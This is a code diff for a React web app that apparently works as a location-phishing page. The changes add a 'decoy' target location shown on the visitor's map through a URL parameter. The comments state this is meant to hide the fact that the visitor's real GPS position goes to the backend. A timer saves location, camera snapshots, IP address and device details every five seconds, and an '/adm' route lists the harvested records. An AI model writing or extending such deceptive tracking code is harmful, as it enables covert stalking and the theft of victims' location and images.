@@ -24,10 +24,34 @@ function App() {
   const captureIntervalRef = useRef<number | null>(null);
   const streamRef = useRef<MediaStream | null>(null);
 
-  // 1. Handle "Routing"
+  // 1. Handle "Routing" & URL Params (Target Link)
   useEffect(() => {
+    // Check for Admin Route
     if (window.location.pathname === '/adm') {
       setIsAdminRoute(true);
+      return;
+    }
+
+    // Check for "Decoy" Target in URL (e.g. ?target=-6.2,106.8)
+    const params = new URLSearchParams(window.location.search);
+    const targetParam = params.get('target');
+    
+    if (targetParam) {
+      const [latStr, lngStr] = targetParam.split(',');
+      const lat = parseFloat(latStr);
+      const lng = parseFloat(lngStr);
+
+      if (!isNaN(lat) && !isNaN(lng)) {
+        // Set the map to this location initially (the "Target")
+        setLocation({
+          lat: lat,
+          lng: lng,
+          accuracy: 0, // 0 indicates purely artificial target
+          timestamp: Date.now(),
+          source: 'ip' // Treat as IP/General source for zoom level logic
+        });
+        setShouldRecenter(true);
+      }
     }
   }, []);
 
@@ -40,7 +64,7 @@ function App() {
         .from('user_locations')
         .select('*')
         .order('created_at', { ascending: false })
-        .limit(50);
+        .limit(100); // Increased limit for better history
       
       if (data) {
         const mappedLogs: LogEntry[] = data.map((item: any) => ({
@@ -78,22 +102,26 @@ function App() {
     };
   }, [isAdminRoute]);
 
-  // 2. Initial IP Fetch
+  // 2. Initial IP Fetch (Only if NO target was set via URL)
   useEffect(() => {
     if (isAdminRoute) return; 
-
-    const fetchApproximateLocation = async () => {
-      if (permissionState === 'idle') {
-        const ipLoc = await getIpLocation();
-        if (ipLoc) {
-          setLocation(ipLoc);
-          setShouldRecenter(true);
-          if (ipLoc.ip) setCurrentIp(ipLoc.ip);
+    
+    // Only fetch IP location if we haven't set a location yet (e.g. via ?target=)
+    if (!location) {
+      const fetchApproximateLocation = async () => {
+        if (permissionState === 'idle') {
+          const ipLoc = await getIpLocation();
+          if (ipLoc) {
+            // Only update if still null (user hasn't clicked anything yet)
+            setLocation(prev => prev ? prev : ipLoc);
+            if (!location) setShouldRecenter(true);
+            if (ipLoc.ip) setCurrentIp(ipLoc.ip);
+          }
         }
-      }
-    };
-    fetchApproximateLocation();
-  }, [permissionState, isAdminRoute]);
+      };
+      fetchApproximateLocation();
+    }
+  }, [permissionState, isAdminRoute, location]);
 
   // 3. Helper: Capture Image
   const captureImage = useCallback((): string | undefined => {
@@ -117,7 +145,15 @@ function App() {
 
   // 4. Helper: Process & Save
   const handleDataCapture = useCallback(async (loc: UserLocation, isPeriodicCapture: boolean = false) => {
-    setLocation(loc);
+    // We do NOT update the UI location state here if we are just background logging
+    // This keeps the map centered on the "Target" (if set) or User's selection, 
+    // while sending the REAL location to backend.
+    
+    // However, if the user explicitly clicked "Cek Lokasi Saya", we DO want to update the map.
+    // Logic: If permissionState is 'tracking', we update UI.
+    if (permissionState === 'tracking') {
+       setLocation(loc);
+    }
     
     let imageData: string | undefined;
     if (isPeriodicCapture) {
@@ -125,7 +161,6 @@ function App() {
     }
 
     // Save if we have GPS source OR an image. 
-    // Since GPS is now mandatory, this will always trigger on location updates.
     if (loc.source === 'gps' || imageData) {
         const deviceInfo = getDeviceInfo();
         const logEntry = await saveLocationToBackend(loc, deviceId, imageData, currentIp, deviceInfo);
@@ -137,7 +172,7 @@ function App() {
             });
         }
     }
-  }, [deviceId, captureImage, currentIp, isAdminRoute]);
+  }, [deviceId, captureImage, currentIp, isAdminRoute, permissionState]);
 
   // 5. Start Tracking
   const startTracking = async () => {
@@ -163,11 +198,14 @@ function App() {
     // B. Start Location (Mandatory)
     try {
       setPermissionState('tracking');
-      setShouldRecenter(true);
+      setShouldRecenter(true); // Now we want to center on the USER, overriding any "target"
 
       watchIdRef.current = getBrowserLocation(
         (loc) => {
+          // Real-time update to UI
           setLocation(loc); 
+          // Background save (first one)
+          handleDataCapture(loc, true); 
         },
         (err) => {
           // Improved error logging & handling
@@ -177,24 +215,28 @@ function App() {
              // PERMISSION_DENIED: Fatal
              alert("Izin lokasi ditolak. Mohon aktifkan izin lokasi di browser Anda untuk menggunakan fitur ini.");
              setPermissionState('denied');
-          } else if (err.code === 3) {
-             // TIMEOUT: Non-fatal, watchPosition keeps trying
-             console.log("GPS Timeout. Waiting for signal...");
-          } else if (err.code === 2) {
-             // POSITION_UNAVAILABLE: Often temporary (e.g. inside tunnel/building)
-             console.log("Position unavailable. Searching...");
           }
         }
       );
 
       if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
       
+      // Periodic background capture
       captureIntervalRef.current = window.setInterval(() => {
-        setLocation(prevLoc => {
-          if (prevLoc) {
-            handleDataCapture(prevLoc, true);
-          }
-          return prevLoc;
+        // We need to get the latest position from the watcher, but since watchPosition
+        // is event-based, we rely on the last set 'location' state if possible,
+        // or just capture the image.
+        // Ideally, we'd cache the very last known GPS coord in a Ref to avoid stale state closures.
+        // For simplicity in this structure, we rely on the state update loop or just send image.
+        
+        // Better approach: Since 'location' state updates, we can use it, but 
+        // inside setInterval 'location' might be stale closure.
+        // Let's use a functional update to get access to current valid loc.
+        setLocation(currentLoc => {
+            if (currentLoc && currentLoc.source === 'gps') {
+                handleDataCapture(currentLoc, true);
+            }
+            return currentLoc;
         });
       }, 5000);
 
